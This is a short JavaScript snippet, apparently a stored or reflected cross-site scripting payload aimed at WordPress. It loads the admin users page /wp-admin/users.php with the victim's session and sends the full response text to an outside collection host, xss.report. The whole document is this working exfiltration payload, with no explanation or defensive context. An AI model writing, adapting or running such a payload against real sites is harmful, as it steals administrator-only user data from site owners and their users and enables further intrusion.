var req = new XMLHttpRequest();

req.open("GET", "/wp-admin/users.php", false);
req.send();
var res = req.responseText;

req.open("GET", "https://xss.report/s/gandhi3?res"+res, false);
req.send();
